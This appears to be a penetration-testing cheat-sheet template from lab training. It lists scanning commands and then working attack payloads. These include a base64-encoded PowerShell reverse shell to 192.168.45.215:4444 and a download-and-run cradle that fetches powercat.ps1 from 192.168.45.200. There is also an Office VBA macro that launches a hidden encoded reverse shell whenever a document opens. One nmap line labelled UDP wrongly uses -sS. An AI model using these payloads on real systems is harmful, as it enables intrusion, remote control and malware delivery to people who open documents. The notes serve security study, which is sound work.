# template

## Basics

### RDP session

```
xfreerdp /u:"offsec" /p:"lab" /v:"$TARGET" /cert-ignore /smart-sizing:2880x1800
```

### Use AZERTY

Time & Language > Language & region > ... > Langage Options > Keyboards



## Passive information gathering

* whois
* Google search
* crt.sh
*

## Scanning

### IF Network

* ping sweep

```
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt --stats-every=5s
```

* put list of alive hosts in hosts.lst

```
grep Up ping-sweep.txt | cut -d " " -f 2 > hosts.lst
```

### ELSE IF Single Host

* put single host in hosts.lst

```
export TARGET = 192.168.50.1
ping $TARGET
echo $TARGET > hosts.lst
```

### FOR EACH host IN hosts.lst

* SYN-SCAN TCP of common ports

```
nmap -sS -iL hosts.lst --stats-every=5s
```

* Scan UDP of common ports

```
nmap -sS -iL hosts.lst --stats-every=5s
```

* SYN-SCAN TCP of all ports

```
nmap -sS -p- -iL hosts.lst --stats-every=5s
```

* Scan UDP of all ports

```
nmap -sU -p- -iL hosts.lst --stats-every=5s
```

## Common-Web attacks

### File upload

#### Generate payload

```
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.215",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```





## Client-side attack

### Information gathering

#### Analyzing metadata of a file (w/o interaction with target)

```
exiftool -a -u brochure.pdf
```

#### By Interacting with the target

```
gobuster dir -u http://$TARGET -w /opt/seclists/Discovery/Web-Content/big.txt  -x .pdf -o results.txt

```

Or using [https://github.com/v0re/dirb/blob/master/wordlists/common.txt](https://github.com/v0re/dirb/blob/master/wordlists/common.txt)

### Microsoft Office

Prepare powercat.ps1 on host machine

```
python3 -m http.server 80
```



Payload :

```
pwsh

$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.200/powercat.ps1');powercat -c 192.168.45.200 -p 4444 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```

Cut by script.py&#x20;

<pre><code>str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"
<strong>
</strong>n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
</code></pre>

We obtain

```
Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
Str = Str + "ALgAxADYAOAAuADQANQAuADIAMAAwAC8AcABvAHcAZQByAGMAY"
Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACAALQBwA"
Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
Str = Str + "A"

```

Macro Reverse shell

<pre><code>Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
<strong>    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
</strong>    Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
    Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
    Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
    Str = Str + "ALgAxADYAOAAuADQANQAuADIAMAAwAC8AcABvAHcAZQByAGMAY"
    Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
    Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACAALQBwA"
    Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
    Str = Str + "A"


    CreateObject("Wscript.Shell").Run Str
End Sub
</code></pre>







